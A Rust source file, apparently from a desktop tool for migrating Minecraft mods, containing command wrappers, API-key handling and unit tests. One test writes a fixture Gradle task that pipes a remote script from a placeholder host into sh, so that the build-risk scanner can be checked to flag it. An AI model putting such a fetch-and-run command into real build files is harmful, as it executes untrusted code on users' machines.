//! Command bodies. Each one is a thin call into `AppServices` (ADR 0004).
//! No migration, scan, build, or filesystem business logic lives in this crate.

use std::path::Path;
use std::sync::Arc;

use serde::Serialize;
use ummp_core::ai::{AgentKind, AgentModel, AiConfig, AiProvider};
use ummp_core::app::views::{
    AnalysisView, JobView, PlanView, RiskLevel, RiskView, SessionView, TargetsView,
};
use ummp_core::app::{
    AppError, AppServices, BuildJobRequest, PackRequest, PlanRequest, PortRequest, Secret, Settings,
};
use ummp_core::modpack::plan::ModIndex;
use uuid::Uuid;

use crate::secrets::SecretStore;
use ummp_ai_providers::{AnthropicProvider, ModrinthIndex, OpenAiCompatibleProvider};

/// The only error shape the web view sees.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct UiError {
    /// `"input"`, `"refused"`, `"not_found"`, `"cancelled"`, or `"internal"`.
    pub kind: &'static str,
    pub message: String,
}

impl From<AppError> for UiError {
    fn from(e: AppError) -> Self {
        let kind = match &e {
            AppError::Input(_) => "input",
            AppError::Refused(_) => "refused",
            AppError::NotFound(_) => "not_found",
            AppError::Cancelled => "cancelled",
            _ => "internal",
        };
        Self {
            kind,
            message: e.to_string(),
        }
    }
}

pub fn analyze(svc: &AppServices, input: &Path) -> Result<AnalysisView, UiError> {
    Ok(svc.analyze(input)?)
}

pub fn scan(svc: &AppServices, input: &Path) -> Result<RiskView, UiError> {
    Ok(svc.scan(input)?)
}

pub fn sessions(svc: &AppServices, limit: usize) -> Result<Vec<SessionView>, UiError> {
    Ok(svc.sessions(limit)?)
}

pub fn targets(svc: &AppServices) -> TargetsView {
    svc.targets()
}

pub fn plan(svc: &AppServices, request: &PlanRequest) -> Result<PlanView, UiError> {
    Ok(svc.plan(request)?)
}

pub fn start_port(svc: &AppServices, request: PortRequest) -> Result<Uuid, UiError> {
    Ok(svc.start_port(request)?)
}

pub fn start_migrate_in_place(
    svc: &AppServices,
    request: PlanRequest,
    reviewed: bool,
) -> Result<Uuid, UiError> {
    Ok(svc.start_migrate_in_place(request, reviewed)?)
}

pub fn job(svc: &AppServices, id: Uuid) -> Result<JobView, UiError> {
    Ok(svc.job(id)?)
}

pub fn cancel(svc: &AppServices, id: Uuid) -> Result<(), UiError> {
    Ok(svc.cancel(id)?)
}

pub fn decide(svc: &AppServices, approval: Uuid, approve: bool) -> Result<(), UiError> {
    Ok(svc.decide(approval, approve)?)
}

pub fn rollback(
    svc: &AppServices,
    project: &Path,
    checkpoint: Option<Uuid>,
) -> Result<(), UiError> {
    Ok(svc.rollback(project, checkpoint)?)
}

fn job_output_path(job: &JobView) -> Result<std::path::PathBuf, UiError> {
    let result = job.result.as_ref().ok_or_else(|| UiError {
        kind: "not_found",
        message: "this job has no output folder".into(),
    })?;
    let raw = result
        .get("output")
        .and_then(serde_json::Value::as_str)
        .or_else(|| result.get("workdir").and_then(serde_json::Value::as_str))
        .ok_or_else(|| UiError {
            kind: "not_found",
            message: "this job has no output folder".into(),
        })?;
    let path = std::path::PathBuf::from(raw);
    let metadata = std::fs::metadata(&path).map_err(|e| UiError {
        kind: "not_found",
        message: format!("output folder is unavailable: {e}"),
    })?;
    if !metadata.is_dir() {
        return Err(UiError {
            kind: "input",
            message: "job output is not a folder".into(),
        });
    }
    Ok(path)
}

pub fn open_output(svc: &AppServices, id: Uuid) -> Result<(), UiError> {
    let job = svc.job(id)?;
    let path = job_output_path(&job)?;
    tauri_plugin_opener::open_path(&path, None::<&str>).map_err(|e| UiError {
        kind: "internal",
        message: format!("could not open the output folder: {e}"),
    })
}

pub fn settings(svc: &AppServices) -> Settings {
    svc.settings()
}

pub fn save_settings(svc: &AppServices, value: Settings) -> Result<(), UiError> {
    Ok(svc.save_settings(value)?)
}

pub fn set_secret(store: &dyn SecretStore, name: &str, value: &str) -> Result<(), UiError> {
    store.set(name, value).map_err(|message| UiError {
        kind: "internal",
        message,
    })
}

pub fn has_secret(store: &dyn SecretStore, name: &str) -> Result<bool, UiError> {
    store
        .get(name)
        .map(|value| value.is_some())
        .map_err(|message| UiError {
            kind: "internal",
            message,
        })
}

pub fn delete_secret(store: &dyn SecretStore, name: &str) -> Result<(), UiError> {
    store.delete(name).map_err(|message| UiError {
        kind: "internal",
        message,
    })
}

pub fn check_build_risk(
    svc: &AppServices,
    path: &Path,
    local: bool,
) -> Result<Option<RiskLevel>, UiError> {
    // Acknowledging both values here is a read-only risk preview, not permission to build.
    Ok(svc.check_build_risk(path, local, true, true)?)
}

pub fn start_build(
    svc: &AppServices,
    store: &dyn SecretStore,
    request: BuildJobRequest,
) -> Result<Uuid, UiError> {
    let token = if request.local {
        None
    } else {
        store
            .get("github_token")
            .map_err(|message| UiError {
                kind: "internal",
                message,
            })?
            .map(Secret::new)
    };
    Ok(svc.start_build_with_token(request, token)?)
}

pub fn start_pack(svc: &AppServices, request: PackRequest) -> Result<Uuid, UiError> {
    let index: Arc<dyn ModIndex + Send + Sync> = Arc::new(ModrinthIndex::new());
    Ok(svc.start_pack(request, index)?)
}

pub fn start_ai_assist(
    svc: &AppServices,
    store: &dyn SecretStore,
    request: PlanRequest,
) -> Result<Uuid, UiError> {
    let provider_name = svc
        .settings()
        .ai_provider
        .unwrap_or_else(|| "anthropic".into());
    let provider: Arc<dyn AiProvider> = match provider_name.as_str() {
        "anthropic" => {
            let key = store
                .get("anthropic_api_key")
                .map_err(|message| UiError {
                    kind: "internal",
                    message,
                })?
                .ok_or_else(|| UiError {
                    kind: "refused",
                    message: "Save an Anthropic API key in Settings before starting AI assist."
                        .into(),
                })?;
            Arc::new(AnthropicProvider::with_api_key(
                key,
                "https://api.anthropic.com",
            ))
        }
        "openai" => {
            let key = store
                .get("openai_api_key")
                .map_err(|message| UiError {
                    kind: "internal",
                    message,
                })?
                .ok_or_else(|| UiError {
                    kind: "refused",
                    message: "Save an OpenAI API key in Settings before starting AI assist.".into(),
                })?;
            Arc::new(OpenAiCompatibleProvider::with_api_key(
                "https://api.openai.com/v1",
                key,
            ))
        }
        _ => {
            return Err(UiError {
                kind: "input",
                message: "Unsupported AI provider. Choose Anthropic or OpenAI in Settings.".into(),
            });
        }
    };
    let mut config = AiConfig::default();
    if provider_name == "openai" {
        for agent in [
            AgentKind::Analysis,
            AgentKind::Migration,
            AgentKind::Debug,
            AgentKind::Review,
        ] {
            config.agents.insert(
                agent,
                AgentModel {
                    model: "gpt-4.1".into(),
                    effort: "medium".into(),
                    max_tokens: 16_000,
                },
            );
        }
    }
    Ok(svc.start_ai_assist(request, provider, config)?)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::secrets::MemorySecretStore;
    use tempfile::tempdir;

    fn services(dir: &Path) -> AppServices {
        AppServices::open(Settings::new(dir.to_path_buf())).unwrap()
    }

    fn fixture(rel: &str) -> std::path::PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/fixtures")
            .join(rel)
    }

    #[test]
    fn analyze_returns_the_core_view_for_a_real_mod_folder() {
        let d = tempdir().unwrap();
        let view = analyze(&services(d.path()), &fixture("loader/fabric-src")).unwrap();
        assert_eq!(view.kind, "folder");
        assert_eq!(view.mods[0].loader, "fabric");
    }

    #[test]
    fn missing_input_becomes_an_input_error_with_the_core_message() {
        let d = tempdir().unwrap();
        let err = scan(&services(d.path()), &d.path().join("nope")).unwrap_err();
        assert_eq!(err.kind, "input");
        assert!(err.message.contains("does not exist"), "{err:?}");
    }

    #[test]
    fn sessions_is_empty_on_a_fresh_data_folder_and_targets_lists_loaders() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        assert!(sessions(&svc, 10).unwrap().is_empty());
        assert!(!targets(&svc).loaders.is_empty());
    }

    #[test]
    fn plan_returns_the_core_diff_without_writing_the_source() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        let source = fixture("loader/fabric-src");
        let request = PlanRequest {
            input: source.clone(),
            from: Some("1.20.1".into()),
            to: "1.21.1".into(),
            loader: Some("neoforge".into()),
            min_confidence: 0.8,
        };
        let view = plan(&svc, &request).unwrap();
        assert_eq!(view.target_minecraft, "1.21.1");
        assert!(!view.files.is_empty());
        assert!(source.join("src/main/resources/fabric.mod.json").exists());
    }

    #[test]
    fn unreviewed_in_place_apply_is_refused_at_the_command_boundary() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        let request = PlanRequest {
            input: fixture("loader/fabric-src"),
            from: Some("1.20.1".into()),
            to: "1.21.1".into(),
            loader: Some("neoforge".into()),
            min_confidence: 0.8,
        };
        let err = start_migrate_in_place(&svc, request, false).unwrap_err();
        assert_eq!(err.kind, "refused");
    }

    #[test]
    fn set_then_has_secret_and_no_command_returns_the_secret_value() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        let store = MemorySecretStore::default();
        set_secret(&store, "anthropic_api_key", "test-secret-value").unwrap();
        assert!(has_secret(&store, "anthropic_api_key").unwrap());
        let returned_settings = serde_json::to_string(&settings(&svc)).unwrap();
        assert!(!returned_settings.contains("test-secret-value"));
        delete_secret(&store, "anthropic_api_key").unwrap();
        assert!(!has_secret(&store, "anthropic_api_key").unwrap());
    }

    #[test]
    fn build_risk_preview_reports_high_without_running_a_build() {
        let d = tempdir().unwrap();
        let svc = services(d.path());
        let high = d.path().join("high");
        std::fs::create_dir_all(&high).unwrap();
        std::fs::write(
            high.join("build.gradle"),
            "plugins { id 'java' }\ntask setup(type: Exec) { commandLine 'sh', '-c', 'curl https://example.invalid/x.sh | sh' }",
        ).unwrap();
        assert_eq!(
            check_build_risk(&svc, &high, true).unwrap(),
            Some(RiskLevel::High)
        );
    }

    #[test]
    fn output_path_is_taken_from_the_job_result_and_must_be_a_directory() {
        let d = tempdir().unwrap();
        let job = JobView {
            id: Uuid::new_v4(),
            session: Uuid::new_v4(),
            step: "done".into(),
            state: ummp_core::jobs::JobState::Succeeded,
            progress: None,
            log: Vec::new(),
            result: Some(serde_json::json!({ "output": d.path().to_string_lossy().to_string() })),
            error: None,
        };
        assert_eq!(job_output_path(&job).unwrap(), d.path().to_path_buf());

        let file = d.path().join("not-a-folder.txt");
        std::fs::write(&file, "x").unwrap();
        let bad = JobView {
            result: Some(serde_json::json!({ "workdir": file })),
            ..job.clone()
        };
        assert_eq!(job_output_path(&bad).unwrap_err().kind, "input");

        let missing = JobView {
            result: None,
            ..job
        };
        assert_eq!(job_output_path(&missing).unwrap_err().kind, "not_found");
    }

    #[test]
    fn error_kinds_map_one_to_one() {
        let k = |e: AppError| UiError::from(e).kind;
        assert_eq!(k(AppError::Refused("x".into())), "refused");
        assert_eq!(k(AppError::NotFound("x".into())), "not_found");
        assert_eq!(k(AppError::Cancelled), "cancelled");
        assert_eq!(k(AppError::Io(std::io::Error::other("x"))), "internal");
    }
}
